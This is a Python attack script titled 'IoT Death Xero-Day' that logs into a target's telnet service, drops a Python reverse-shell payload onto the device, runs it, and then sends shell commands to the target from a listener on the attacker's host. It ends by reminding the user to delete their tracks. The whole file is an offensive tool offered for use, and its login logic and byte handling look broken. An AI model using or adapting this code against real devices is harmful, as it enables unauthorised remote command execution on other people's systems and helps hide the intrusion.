#!/usr/bin/python3

import socket
import telnetlib
import argparse
import getpass


class Colors:
    def __init__(self):
        pass

    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'
    green = '\033[0;32m'


# Name Of Exploit: IOT DEATH <> Made By: Fancy
parser = argparse.ArgumentParser(
    description=f"( {Colors.red}IoT Death Xero-Day{Colors.end} ) Telnet 0 Day ( {Colors.green}Chained Remote Root Command Execution{Colors.end} )")
parser.add_argument("-lh", metavar="", help="Enter Lhost | (-lh localhost)")
parser.add_argument("-lp", metavar="", help="Enter Lport | (-lp 8888)")
parser.add_argument("-t", metavar="", help="Target Telnet Ip Address   | (-t localhost)")
parser.add_argument("-p", metavar="", help="Target Telnet Port Address | (-p 23)")
argument = parser.parse_args()


def telnet_exploit():
    # The actual remote code execution
    class RemoteCodeExecution(object):
        def __init__(self, local_host, local_port):
            self.local_port = local_port
            self.local_host = local_host

        # This would be the attacker code or exploit code (run this on your machine)
        def exploit_code(self):

            try:
                sock = socket.socket()
                sock.bind((self.local_host, int(self.local_port)))
                sock.listen(5)
                connection, address = sock.accept()
                print("Connected To:" + address[0] + " : " + str(address[1]))
                reverse_shell_command = input(
                    f"{Colors.red}(Chained Remote Telnet Command Execution){Colors.end} [Enter Remote Command]:~#")
                if len(str.encode(reverse_shell_command)) > 0:
                    # under here we need to send the remote command
                    connection.send(str.encode(reverse_shell_command))
                    response = str(connection.recv(1024), "utf-8")
                    print(response, end="")
                    sock.close()
                    connection.close()
                    print(
                        f"{Colors.red}[+] Reminder: You Should Go Back And Delete Your Tracks! {Colors.end}")
            except socket.error as message:
                print(str(message))
                return 0

    if __name__ == '__main__':
        question = input(
            f"{Colors.red}(Chained Remote Telnet Command Execution){Colors.end} [Would You Like To Proceed? (y or n)]:~#")
        if question == "n" or question == "N":
            exit(0)
        else:
            class InitialSendingData(object):
                def __init__(self, telnet_address, telnet_port):
                    self.telnet_address = telnet_address
                    self.telnet_port = telnet_port

                def telnet_interaction(self):
                    # Instead of this payload we can use a piece of shell code to generate a reverse shell
                    connect_back_payload = f"""
import subprocess as sub
import socket
import os
def client_code(local_host, local_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((local_host, int(local_port)))
    all_data = sock.recv(1024)
    if all_data[:2].decode("utf-8") == 'cd':
        os.chdir(all_data[3:].decode("utf-8"))
    if len(all_data) > 0:
        command = sub.Popen(all_data[:].decode("utf-8"), shell=True, stdout=sub.PIPE, stderr=sub.PIPE,
            stdin=sub.PIPE)
        output_data = command.stdout.read() + command.stderr.read()
        output_string = str(output_data, "utf-8")
        sock.send(str.encode(output_string + str(os.getcwd()) + '> '))
client_code(local_host={argument.lh}, local_port={argument.lp})
"""
                    telnet = telnetlib.Telnet(self.telnet_address, port=self.telnet_port)
                    passwd = getpass.getpass()
                    if telnet.read_until(b"login: "):
                        telnet.write("anonymous".encode('ascii') + b"\n")
                    elif passwd:
                        telnet.read_until(b"Password: ")
                        telnet.write("anonymous".encode('ascii') + b"\n")
                    elif passwd:
                        telnet.read_until(b"Password: ")
                        telnet.write("".encode('ascii') + b"\n")
                    else:
                        telnet.write(bytes(f"echo '{connect_back_payload}' > pay_load_xxx.py\n"))
                        telnet.write(b"python3 pay_load_xxx.py\n")

            # This is where we send all the exploit code
            def send_exploit():
                # Start listening for the remote connection
                client_code = RemoteCodeExecution(
                    local_host=argument.lh,
                    local_port=argument.lp
                )
                # Send payload function with telnet
                send_payload = InitialSendingData(telnet_address=argument.t, telnet_port=argument.p)
                send_payload.telnet_interaction()
                # Wait for payload to be executed and then send the command
                print(f"{Colors.red}[Wait For Payload To Be Executed]{Colors.end}")
                client_code.exploit_code()

            send_exploit()


try:
    telnet_exploit()
except KeyboardInterrupt:
    exit(0)
